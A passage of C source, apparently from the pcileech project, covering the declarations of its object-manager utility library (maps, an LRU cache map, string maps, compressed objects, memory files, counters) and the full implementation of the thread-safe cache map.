* -- pm
* -- index
* -- return
*/
PVOID ObMap_GetByIndex(_In_opt_ POB_MAP pm, _In_ DWORD index);

/*
* Retrieve the key for an existing object in the ObMap.
* -- pm
* -- pvObject
* -- return
*/
_Success_(return != 0)
QWORD ObMap_GetKey(_In_opt_ POB_MAP pm, _In_ PVOID pvObject);

/*
* Common filter function related to ObMap_FilterSet.
*/
VOID ObMap_FilterSet_FilterAllKey(_In_ QWORD k, _In_ PVOID v, _Inout_ POB_SET ps);

/*
* Filter map objects into a generic context by using a user-supplied filter function.
* -- pm
* -- ctx = optional context to pass on to the filter function.
* -- pfnFilter
* -- return
*/
_Success_(return)
BOOL ObMap_Filter(_In_opt_ POB_MAP pm, _Inout_opt_ PVOID ctx, _In_opt_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_opt_ PVOID ctx));

/*
* Filter map objects into a POB_SET by using a user-supplied filter function.
* CALLER DECREF: return
* -- pm
* -- pfnFilter
* -- return = POB_SET consisting of values gathered by the pfnFilter function.
*/
_Success_(return != NULL)
POB_SET ObMap_FilterSet(_In_opt_ POB_MAP pm, _In_opt_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_ POB_SET ps));

/*
* Remove map objects using a user-supplied filter function.
* -- pm
* -- pfnFilter = decision making function: [pfnFilter(k,v)->TRUE(remove)|FALSE(keep)]
* -- return = number of entries removed.
*/
DWORD ObMap_RemoveByFilter(_In_opt_ POB_MAP pm, _In_opt_ BOOL(*pfnFilter)(_In_ QWORD k, _In_ PVOID v));



// ----------------------------------------------------------------------------
// CACHE MAP FUNCTIONALITY BELOW:
//
// The map (ObCacheMap) implements an efficient caching of objects stored in
// an internal hash map. The cached object are retrieved and cleared according
// to rules implemented by callback functions.
//
// If the max number of map entries are reached the least recently accessed
// entry will be removed if required to make room for a new entry.
//
// The map (ObCacheMap) is thread safe.
// The ObCacheMap is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_CACHEMAP *POB_CACHEMAP;

#define OB_CACHEMAP_FLAGS_OBJECT_VOID        0x00
#define OB_CACHEMAP_FLAGS_OBJECT_OB          0x01
#define OB_CACHEMAP_FLAGS_OBJECT_LOCALFREE   0x02

/*
* Create a new cached map. A cached map (ObCacheMap) provides atomic map
* operations on cached objects.
* The ObCacheMap is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- cMaxEntries = max entries in the cache, if more entries are added the
*       least recently accessed item will be removed from the cache map.
* -- pfnValidEntry = validation callback function (if any).
* -- flags = defined by OB_CACHEMAP_FLAGS_*
* -- return
*/
POB_CACHEMAP ObCacheMap_New(
    _In_ DWORD cMaxEntries,
    _In_opt_ BOOL(*pfnValidEntry)(_Inout_ PQWORD qwContext, _In_ QWORD qwKey, _In_ PVOID pvObject),
    _In_ QWORD flags
);

/*
* Clear the ObCacheMap by removing all objects and their keys.
* -- pcm
* -- return = clear was successful - always true.
*/
_Success_(return)
BOOL ObCacheMap_Clear(_In_opt_ POB_CACHEMAP pcm);

/*
* Check if a key exists in the ObCacheMap.
* -- pcm
* -- qwKey/pvObject
* -- return
*/
BOOL ObCacheMap_ExistsKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey);

/*
* Push / Insert into the ObCacheMap. If an object with the same key already
* exists it's removed from the cache map before the new object is inserted.
* If pvObject is OB the map performs Ob_INCREF on its own reference.
* -- pcm
* -- qwKey
* -- pvObject
* -- qwContextInitial = initial context (passed on to pfnValidEntry callback).
* -- return = TRUE on insertion, FALSE otherwise - i.e. if the key or object
*             already exists or if the max capacity of the map is reached.
*/
_Success_(return)
BOOL ObCacheMap_Push(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ QWORD qwContextInitial);

/*
* Retrieve the number of objects in the ObCacheMap.
* -- pcm
* -- return
*/
DWORD ObCacheMap_Size(_In_opt_ POB_CACHEMAP pcm);

/*
* Retrieve a value given a key.
* CALLER DECREF(if OB): return
* -- pcm
* -- qwKey
* -- return
*/
PVOID ObCacheMap_GetByKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey);

/*
* Remove an object from the ObCacheMap by using its key.
* NB! Object is removed and returned even if valid critera is not matched.
* CALLER DECREF(if OB): return
* -- pcm
* -- qwKey
* -- return = success: object, fail: NULL.
*/
PVOID ObCacheMap_RemoveByKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey);


// ----------------------------------------------------------------------------
// STRMAP FUNCTIONALITY BELOW:
// 
// The strmap is created and populated with strings (utf-8, ascii and wide-char)
// in an optimal way removing duplicates. Upon finalization the string map
// results in a multi-string and an update of string references will happen.
//
// References to the strings will only be valid after a successful call to
// FinalizeAlloc_DECREF_NULL() or FinalizeBuffer()
//
// The strmap is only meant to be an interim object to be used for creation
// of multi-string values and should not be kept as a long-lived object.
//
// The ObStrMap is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_STRMAP *POB_STRMAP;

// Strings in OB_STRMAP are considered to be CASE SENSITIVE.
#define OB_STRMAP_FLAGS_CASE_SENSITIVE         0x00

// Strings in OB_STRMAP are considered to be CASE INSENSITIVE. The case is
// preserved for 1st unique entry added; subsequent entries will use 1st entry.
#define OB_STRMAP_FLAGS_CASE_INSENSITIVE       0x01

// Assign temporary string values to destinations at time of push.
// NB! values will become invalid after OB_STRMAP DECREF/FINALIZE!
#define OB_STRMAP_FLAGS_STR_ASSIGN_TEMPORARY   0x02

// Assign offset in number of bytes to string pointers at finalize stage
// instead of pointers. Offset is counted from base of multi-string.
// incompatible with OB_STRMAP_FLAGS_STR_ASSIGN_TEMPORARY option.
#define OB_STRMAP_FLAGS_STR_ASSIGN_OFFSET      0x04

//
// STRMAP BELOW:
//

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- usz
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushU(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR usz);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- sz
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushA(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR sz);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- wsz
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushW(_In_opt_ POB_STRMAP psm, _In_opt_ LPWSTR wsz);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- usz
* -- puszDst
* -- pcbuDst
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrUU(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR usz, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- sz
* -- puszDst
* -- pcbuDst
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrAU(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR sz, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- wsz
* -- puszDst
* -- pcbuDst
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrWU(_In_opt_ POB_STRMAP psm, _In_opt_ LPWSTR wsz, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- usz
* -- pwszDst
* -- pcbwDst
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrUW(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR usz, _Out_opt_ LPWSTR *pwszDst, _Out_opt_ PDWORD pcbwDst);

/*
* Push / Insert into the ObStrMap.
* -- psm
* -- wsz
* -- pwszDst
* -- pcbwDst
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrWW(_In_opt_ POB_STRMAP psm, _In_opt_ LPWSTR wsz, _Out_opt_ LPWSTR *pwszDst, _Out_opt_ PDWORD pcbwDst);

/*
* Push / Insert into the ObStrMap. Result pointer is dependant on fWideChar flag.
* -- psm
* -- usz
* -- puszDst = ptr to utf-8 _OR_ wide string depending on fWideChar
* -- pcbuDst = # bytes required to hold *puszDst
* -- fWideChar
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushPtrUXUW(_In_opt_ POB_STRMAP psm, _In_opt_ LPSTR usz, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst, BOOL fWideChar);

/*
* Push a UNICODE_OBJECT Pointer for delayed resolve at finalize stage.
* NB! Incompatible with: OB_STRMAP_FLAGS_STR_ASSIGN_TEMPORARY create flag.
* -- psm
* -- f32 = 32-bit/64-bit unicode object.
* -- vaUnicodeObject
* -- puszDst
* -- pcbuDst
* -- return = TRUE on validation success (NB! no guarantee for final success).
*/
_Success_(return)
BOOL ObStrMap_Push_UnicodeObject(_In_opt_ POB_STRMAP psm, _In_ BOOL f32, _In_ QWORD vaUnicodeObject, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst);

/*
* Push a UNICODE_OBJECT Buffer for delayed resolve at finalize stage.
* NB! Incompatible with: OB_STRMAP_FLAGS_STR_ASSIGN_TEMPORARY create flag.
* -- psm
* -- cbUnicodeBuffer.
* -- vaUnicodeBuffer
* -- puszDst
* -- pcbuDst
* -- return = TRUE on validation success (NB! no guarantee for final success).
*/
_Success_(return)
BOOL ObStrMap_Push_UnicodeBuffer(_In_opt_ POB_STRMAP psm, _In_ WORD cbUnicodeBuffer, _In_ QWORD vaUnicodeBuffer, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst);

/*
* Push / Insert max 2048 char-bytes into ObStrMap using a snprintf_s syntax.
* All szFormat and all string-arguments are assumed to be utf-8 encoded.
* -- psm
* -- puszDst
* -- pcbuDst
* -- uszFormat
* -- ...
* -- return = TRUE on insertion, FALSE otherwise.
*/
_Success_(return)
BOOL ObStrMap_PushUU_snprintf_s(_In_opt_ POB_STRMAP psm, _Out_opt_ LPSTR *puszDst, _Out_opt_ PDWORD pcbuDst, _In_z_ _Printf_format_string_ char const *const uszFormat, ...);

/*
* Finalize the ObStrMap. Create and assign the MultiStr and assign each
* previously added string reference to a pointer location within the MultiStr.
* ---
* Also decrease the reference count of the object. If the reference count
* reaches zero the object will be cleaned up.
* Also set the incoming pointer to NULL.
* CALLER LOCALFREE: *ppbMultiStr
* -- ppObStrMap
* -- ppbMultiStr
* -- pcbMultiStr
* -- return
*/
_Success_(return)
BOOL ObStrMap_FinalizeAllocU_DECREF_NULL(_In_opt_ POB_STRMAP *ppObStrMap, _Out_ PBYTE *ppbMultiStr, _Out_ PDWORD pcbMultiStr);

/*
* Finalize the ObStrMap. Create and assign the MultiStr and assign each
* previously added string reference to a pointer location within the MultiStr.
* ---
* Also decrease the reference count of the object. If the reference count
* reaches zero the object will be cleaned up.
* Also set the incoming pointer to NULL.
* CALLER LOCALFREE: *ppbMultiStr
* -- ppObStrMap
* -- ppbMultiStr
* -- pcbMultiStr
* -- return
*/
_Success_(return)
BOOL ObStrMap_FinalizeAllocW_DECREF_NULL(_In_opt_ POB_STRMAP *ppObStrMap, _Out_ PBYTE *ppbMultiStr, _Out_ PDWORD pcbMultiStr);

/*
* Finalize the ObStrMap. Write the MultiStr into the supplied buffer and assign
* previously added string reference to a pointer location within the MultiStr.
* -- psm
* -- cbuMultiStr
* -- pbMultiStr = NULL for size query
* -- pcbMultiStr
* -- return
*/
_Success_(return)
BOOL ObStrMap_FinalizeBufferU(_In_opt_ POB_STRMAP psm, _In_ DWORD cbMultiStr, _Out_writes_bytes_opt_(cbMultiStr) PBYTE pbMultiStr, _Out_ PDWORD pcbMultiStr);

/*
* Finalize the ObStrMap. Write the MultiStr into the supplied buffer and assign
* previously added string reference to a pointer location within the MultiStr.
* -- psm
* -- cbMultiStr
* -- pbMultiStr = NULL for size query
* -- pcbMultiStr
* -- return
*/
_Success_(return)
BOOL ObStrMap_FinalizeBufferW(_In_opt_ POB_STRMAP psm, _In_ DWORD cbMultiStr, _Out_writes_bytes_opt_(cbMultiStr) PBYTE pbMultiStr, _Out_ PDWORD pcbMultiStr);

/*
* Finalize the ObStrMap as either UTF-8 or Wide. Write the MultiStr into the
* supplied buffer and assign previously added string reference to a pointer
* location within the MultiStr.
* -- psm
* -- cbMultiStr
* -- pbMultiStr = NULL for size query
* -- pcbMultiStr
* -- fWideChar
* -- return
*/
_Success_(return)
BOOL ObStrMap_FinalizeBufferXUW(_In_opt_ POB_STRMAP psm, _In_ DWORD cbMultiStr, _Out_writes_bytes_opt_(cbMultiStr) PBYTE pbMultiStr, _Out_ PDWORD pcbMultiStr, _In_ BOOL fWideChar);

/*
* Create a new strmap. A strmap (ObStrMap) provides an easy way to add new
* strings to a multi-string in an efficient way. The ObStrMap is not meant
* to be a long-term object - it's supposed to be finalized and possibly
* decommissioned by calling any of the ObStrMap_Finalize*() functions.
* The ObStrMap is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- flags
* -- return
*/
_Success_(return != NULL)
POB_STRMAP ObStrMap_New(_In_ QWORD flags);



// ----------------------------------------------------------------------------
// COMPRESSED DATA OBJECT FUNCTIONALITY BELOW:
//
// The ObCompressed is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_COMPRESSED *POB_COMPRESSED;

/*
* Create a new compressed buffer object from a byte buffer.
* CALLER DECREF: return
* -- pb
* -- cb
* -- return
*/
_Success_(return != NULL)
POB_COMPRESSED ObCompressed_NewFromByte(_In_reads_(cb) PBYTE pb, _In_ DWORD cb);

/*
* Create a new compressed buffer object from a zero terminated string.
* CALLER DECREF: return
* -- sz
* -- return
*/
_Success_(return != NULL)
POB_COMPRESSED ObCompress_NewFromStrA(_In_ LPSTR sz);

/*
* Retrieve the uncompressed size of the compressed data object.
* -- pdc
* -- return
*/
DWORD ObCompress_Size(_In_opt_ POB_COMPRESSED pdc);

/*
* Retrieve uncompressed from a compressed data object.
* CALLER DECREF: return
* -- pdc
* -- return
*/
_Success_(return != NULL)
POB_DATA ObCompressed_GetData(_In_opt_ POB_COMPRESSED pdc);



// ----------------------------------------------------------------------------
// MEMORY BACKED FILE FUNCTIONALITY BELOW:
// 
// The memfile is a growing memory backed file that may be read and appended.
// The memfile will be automatically (de)compressed when it's required for
// optimal performance. This object is typically implementing a generated
// output file - such as some forensic JSON data output.
//
// The ObMemFile is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_MEMFILE *POB_MEMFILE;

/*
* Create a new empty memory file.
* CALLER DECREF: return
* -- return
*/
_Success_(return != NULL)
POB_MEMFILE ObMemFile_New();

/*
* Retrieve byte count of the ObMemFile.
* -- pmf
* -- return
*/
QWORD ObMemFile_Size(_In_opt_ POB_MEMFILE pmf);

/*
* Append binary data to the ObMemFile.
* -- pmf
* -- pb
* -- cb
* -- return
*/
_Success_(return)
BOOL ObMemFile_Append(_In_opt_ POB_MEMFILE pmf, _In_reads_(cb) PBYTE pb, _In_ QWORD cb);

/*
* Append a string (ansi or utf-8) to the ObMemFile.
* -- pmf
* -- sz
* -- return
*/
_Success_(return)
BOOL ObMemFile_AppendString(_In_opt_ POB_MEMFILE pmf, _In_opt_z_ LPSTR sz);

/*
* Read data 'as file' from the ObMemFile.
* -- pmf
* -- pb
* -- cb
* -- pcbRad
* -- cbOffset
* -- return
*/
_Success_(return == 0)
NTSTATUS ObMemFile_ReadFile(_In_opt_ POB_MEMFILE pmf, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ QWORD cbOffset);



// ----------------------------------------------------------------------------
// COUNTER FUNCTIONALITY BELOW
// 
// The counter is a auto-growing object that allows counting an unknown amount
// of objects. Counting operations are thread-safe and atomic.
// 
// When counting is completed the counted objects may be retrieved sorted.
//
// The ObCounter is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_COUNTER *POB_COUNTER;

typedef struct tdOB_COUNTER_ENTRY {
    QWORD k;
    QWORD v;
} OB_COUNTER_ENTRY, *POB_COUNTER_ENTRY, **PPOB_COUNTER_ENTRY;

#define OB_COUNTER_FLAGS_SHOW_ZERO      0x01
#define OB_COUNTER_FLAGS_ALLOW_NEGATIVE 0x02

/*
* Create a new counter. A counter (ObCounter) provides atomic counting operations.
* The ObCounter is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- flags = defined by OB_COUNTER_FLAGS_*
* -- return
*/
POB_COUNTER ObCounter_New(_In_ QWORD flags);

/*
* Retrieve the number of counted keys the ObCounter.
* -- pc
* -- return
*/
DWORD ObCounter_Size(_In_opt_ POB_COUNTER pc);

/*
* Retrieve the total count of the ObCounter.
* NB! The resulting count may overflow on large counts!
* -- pc
* -- return
*/
QWORD ObCounter_CountAll(_In_opt_ POB_COUNTER pc);

/*
* Check if the counted key exists in the ObCounter.
* -- pc
* -- k
* -- return
*/
BOOL ObCounter_Exists(_In_opt_ POB_COUNTER pc, _In_ QWORD k);

/*
* Get the count of a specific key.
* -- pc
* -- k
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Get(_In_opt_ POB_COUNTER pc, _In_ QWORD k);

/*
* Remove a specific key.
* -- pc
* -- k
* -- return = the count of the removed key, zero in fail.
*/
QWORD ObCounter_Del(_In_opt_ POB_COUNTER pc, _In_ QWORD k);

/*
* Set the count of a specific key.
* -- pc
* -- k
* -- v
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Set(_In_opt_ POB_COUNTER pc, _In_ QWORD k, _In_ QWORD v);

/*
* Add the count v of a specific key.
* -- pc
* -- k
* -- v
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Add(_In_opt_ POB_COUNTER pc, _In_ QWORD k, _In_ QWORD v);

/*
* Increment the count of a specific key with 1.
* -- pc
* -- k
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Inc(_In_opt_ POB_COUNTER pc, _In_ QWORD k);

/*
* Subtract the count v of a specific key.
* -- pc
* -- k
* -- v
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Sub(_In_opt_ POB_COUNTER pc, _In_ QWORD k, _In_ QWORD v);

/*
* Decrement the count of a specific key with 1.
* -- pc
* -- k
* -- return = the counted value after the action, zero on fail.
*/
QWORD ObCounter_Dec(_In_opt_ POB_COUNTER pc, _In_ QWORD k);

/*
* Retrieve all counts in an unsorted table.
* -- pc
* -- cEntries
* -- pEntries
* -- return
*/
_Success_(return)
BOOL ObCounter_GetAll(_In_opt_ POB_COUNTER pc, _In_ DWORD cEntries, _Out_writes_opt_(cEntries) POB_COUNTER_ENTRY pEntries);

/*
* Retrieve all counts in a sorted table.
* -- pc
* -- cEntries
* -- pEntries
* -- return
*/
_Success_(return)
BOOL ObCounter_GetAllSortedByKey(_In_opt_ POB_COUNTER pc, _In_ DWORD cEntries, _Out_writes_opt_(cEntries) POB_COUNTER_ENTRY pEntries);

/*
* Retrieve all counts in a sorted table.
* -- pc
* -- cEntries
* -- pEntries
* -- return
*/
_Success_(return)
BOOL ObCounter_GetAllSortedByCount(_In_opt_ POB_COUNTER pc, _In_ DWORD cEntries, _Out_writes_opt_(cEntries) POB_COUNTER_ENTRY pEntries);


#endif /* __OB_H__ */

```

`pcileech/ob/ob_cachemap.c`:

```c
// ob_cachemap.c : implementation of object manager cached map functionality.
//
// The map (ObCacheMap) implements an efficient caching of objects stored in
// an internal hash map. The cached object are retrieved and cleared according
// to rules implemented by callback functions.
//
// If the max number of map entries are reached the least recently accessed
// entry will be removed if required to make room for a new entry.
//
// The map (ObCacheMap) is thread safe.
// The ObCacheMap is an object manager object and must be DECREF'ed when required.
//
// (c) Ulf Frisk, 2020-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "ob.h"

#define OB_CACHEMAP_IS_VALID(p)     (p && (p->ObHdr._magic == OB_HEADER_MAGIC) && (p->ObHdr._tag == OB_TAG_CORE_CACHEMAP))

#define OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, RetTp, RetValFail, fn) { \
    if(!OB_CACHEMAP_IS_VALID(pcm)) { return RetValFail; }                                \
    RetTp retVal;                                                                        \
    AcquireSRWLockExclusive(&pcm->LockSRW);                                              \
    retVal = fn;                                                                         \
    ReleaseSRWLockExclusive(&pcm->LockSRW);                                              \
    return retVal;                                                                       \
}

typedef struct tdOB_CACHEMAPENTRY {
    struct tdOB_CACHEMAPENTRY *FLink;
    struct tdOB_CACHEMAPENTRY *BLink;
    PVOID pvObject;
    QWORD qwContext;
} OB_CACHEMAPENTRY, *POB_CACHEMAPENTRY;

typedef struct tdOB_CACHEMAP {
    OB ObHdr;
    SRWLOCK LockSRW;
    DWORD c;
    DWORD cMax;
    BOOL fObjectsOb;
    BOOL fObjectsLocalFree;
    POB_MAP pm;
    POB_CACHEMAPENTRY AgeListHead;
    BOOL(*pfnValidEntry)(_Inout_ PQWORD qwData, _In_ QWORD qwKey, _In_ PVOID pvObject);
} OB_CACHEMAP, *POB_CACHEMAP;


_Success_(return)
BOOL _ObCacheMap_Clear(_In_ POB_CACHEMAP pcm)
{
    POB_CACHEMAPENTRY pe, peNext;
    if(!(peNext = pcm->AgeListHead)) { return TRUE; }
    peNext->BLink->FLink = NULL;
    while((pe = peNext)) {
        peNext = pe->FLink;
        if(pcm->fObjectsOb) {
            Ob_DECREF(pe->pvObject);
        } else if(pcm->fObjectsLocalFree) {
            LocalFree(pe->pvObject);
        }
        LocalFree(pe);
    }
    ObMap_Clear(pcm->pm);
    pcm->AgeListHead = NULL;
    pcm->c = 0;
    return TRUE;
}

/*
* Clear the ObCacheMap by removing all objects and their keys.
* -- pcm
* -- return = clear was successful - always true.
*/
_Success_(return)
BOOL ObCacheMap_Clear(_In_opt_ POB_CACHEMAP pcm)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, BOOL, TRUE, _ObCacheMap_Clear(pcm));
}

PVOID _ObCacheMap_RemoveByKey(_In_ POB_CACHEMAP pcm, _In_ QWORD qwKey, _In_ BOOL fNoReturn)
{
    PVOID pvRemovedObject;
    POB_CACHEMAPENTRY pe;
    if(!(pe = ObMap_RemoveByKey(pcm->pm, qwKey))) { return NULL; }
    pe->FLink->BLink = pe->BLink;
    pe->BLink->FLink = pe->FLink;
    pcm->c--;
    if(pcm->c == 0) {
        pcm->AgeListHead = NULL;
    } else if(pcm->AgeListHead == pe) {
        pcm->AgeListHead = pe->FLink;
    }
    pvRemovedObject = pe->pvObject;
    LocalFree(pe);
    if(fNoReturn && pvRemovedObject) {
        if(pcm->fObjectsOb) {
            Ob_DECREF(pvRemovedObject);
        } else if(pcm->fObjectsLocalFree) {
            LocalFree(pvRemovedObject);
        }
        pvRemovedObject = NULL;
    }
    return pvRemovedObject;
}

PVOID _ObCacheMap_GetByKey(_In_ POB_CACHEMAP pcm, _In_ QWORD qwKey)
{
    POB_CACHEMAPENTRY pe;
    if(!(pe = ObMap_GetByKey(pcm->pm, qwKey))) { return NULL; }
    if(pcm->pfnValidEntry && !pcm->pfnValidEntry(&pe->qwContext, qwKey, pe->pvObject)) {
        // invalid - remove object from map and return NULL
        _ObCacheMap_RemoveByKey(pcm, qwKey, TRUE);
        return NULL;
    }
    // valid - move to front of age list and return object
    if(pcm->AgeListHead != pe) {
        pe->FLink->BLink = pe->BLink;
        pe->BLink->FLink = pe->FLink;
        pe->BLink = pcm->AgeListHead->BLink;
        pe->FLink = pcm->AgeListHead;
        pcm->AgeListHead->BLink->FLink = pe;
        pcm->AgeListHead->BLink = pe;
        pcm->AgeListHead = pe;
    }
    if(pcm->fObjectsOb) { Ob_INCREF(pe->pvObject); }
    return pe->pvObject;
}

_Success_(return)
BOOL _ObCacheMap_Push(_In_ POB_CACHEMAP pcm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ QWORD qwContextInitial)
{
    QWORD qwRemovedKey;
    POB_CACHEMAPENTRY pe;
    if(!qwKey || !pvObject) { return FALSE; }
    // 1: remove existing object with same key
    _ObCacheMap_RemoveByKey(pcm, qwKey, TRUE);
    // 2: remove least recently accessed object (if required)
    if(pcm->c >= pcm->cMax) {
        pe = pcm->AgeListHead->BLink;
        qwRemovedKey = ObMap_GetKey(pcm->pm, pe);
        _ObCacheMap_RemoveByKey(pcm, qwRemovedKey, TRUE);
    }
    // 3: add new object
    if(!(pe = LocalAlloc(0, sizeof(OB_CACHEMAPENTRY)))) { return FALSE; }
    if(pcm->fObjectsOb) { Ob_INCREF(pvObject); }
    pe->pvObject = pvObject;
    pe->qwContext = qwContextInitial;
    if(pcm->AgeListHead) {
        pe->BLink = pcm->AgeListHead->BLink;
        pe->FLink = pcm->AgeListHead;
        pcm->AgeListHead->BLink->FLink = pe;
        pcm->AgeListHead->BLink = pe;
    } else {
        pe->BLink = pe->FLink = pe;
    }
    ObMap_Push(pcm->pm, qwKey, pe);
    pcm->AgeListHead = pe;
    pcm->c++;
    return TRUE;
}

/*
* Retrieve a value given a key.
* CALLER DECREF(if OB): return
* -- pcm
* -- qwKey
* -- return
*/
PVOID ObCacheMap_GetByKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, PVOID, NULL, _ObCacheMap_GetByKey(pcm, qwKey));
}

/*
* Remove an object from the ObCacheMap by using its key.
* NB! Object is removed and returned even if valid critera is not matched.
* CALLER DECREF(if OB): return
* -- pcm
* -- qwKey
* -- return = success: object, fail: NULL.
*/
PVOID ObCacheMap_RemoveByKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, PVOID, NULL, _ObCacheMap_RemoveByKey(pcm, qwKey, FALSE));
}

/*
* Check if a key exists in the ObCacheMap.
* -- pcm
* -- qwKey/pvObject
* -- return
*/
BOOL ObCacheMap_ExistsKey(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, DWORD, 0, ObMap_ExistsKey(pcm->pm, qwKey))
}

/*
* Retrieve the number of objects in the ObCacheMap.
* -- pcm
* -- return
*/
DWORD ObCacheMap_Size(_In_opt_ POB_CACHEMAP pcm)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, DWORD, 0, pcm->c);
}

_Success_(return)
BOOL ObCacheMap_Push(_In_opt_ POB_CACHEMAP pcm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ QWORD qwContextInitial)
{
    OB_CACHEMAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pcm, BOOL, FALSE, _ObCacheMap_Push(pcm, qwKey, pvObject, qwContextInitial))
}

/*
* Object Map object manager cleanup function to be called when reference
* count reaches zero.
* -- pObMap
*/
VOID _ObCacheMap_ObCloseCallback(_In_ POB_CACHEMAP pObCacheMap)
{
    _ObCacheMap_Clear(pObCacheMap);
    Ob_DECREF(pObCacheMap->pm);
}

/*
* Create a new cached map. A cached map (ObCacheMap) provides atomic map
* operations on cached objects.
* The ObCacheMap is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- cMaxEntries = max entries in the cache, if more entries are added the
*       least recently accessed item will be removed from the cache map.
* -- pfnValidEntry = optional validation callback function.
* -- flags = defined by OB_CACHEMAP_FLAGS_*
* -- return
*/
POB_CACHEMAP ObCacheMap_New(_In_ DWORD cMaxEntries, _In_opt_ BOOL(*pfnValidEntry)(_Inout_ PQWORD qwContext, _In_ QWORD qwKey, _In_ PVOID pvObject), _In_ QWORD flags)
{
    POB_CACHEMAP pObCacheMap;
    if(!cMaxEntries) { return NULL; }
    if((flags & OB_MAP_FLAGS_OBJECT_OB) && (flags & OB_MAP_FLAGS_OBJECT_LOCALFREE)) { return NULL; }
    pObCacheMap = Ob_Alloc(OB_TAG_CORE_CACHEMAP, LMEM_ZEROINIT, sizeof(OB_CACHEMAP), (OB_CLEANUP_CB)_ObCacheMap_ObCloseCallback, NULL);
    if(!pObCacheMap) { return NULL; }
    InitializeSRWLock(&pObCacheMap->LockSRW);
    pObCacheMap->cMax = cMaxEntries;
    pObCacheMap->pfnValidEntry = pfnValidEntry;
    pObCacheMap->fObjectsOb = (flags & OB_CACHEMAP_FLAGS_OBJECT_OB) ? TRUE : FALSE;
    pObCacheMap->fObjectsLocalFree = (flags & OB_CACHEMAP_FLAGS_OBJECT_LOCALFREE) ? TRUE : FALSE;
    pObCacheMap->pm = ObMap_New(OB_MAP_FLAGS_OBJECT_VOID);
    if(!pObCacheMap->pm) {
        Ob_DECREF(pObCacheMap);
        return NULL;
    }
    return pObCacheMap;
}

```

`pcileech/ob/ob_core.c`:

```c
// ob_core.c : implementation of object manager core functionality.
//
// The object manager is a minimal non-threaded way of allocating objects with
// reference counts. When reference count reach zero the object is deallocated
// automatically.
//
// All Ob functions are thread-safe and performs only minimum locking.
//
// A thread calls Ob_Alloc to allocate an object of a specific length. The
// object initially have reference count 1. Reference counts may be increased
// by calling Ob_INCREF and decreased by calling Ob_DECREF. If the refcount
// reach one or zero in a call to Ob_DECREF optional callbacks may be made
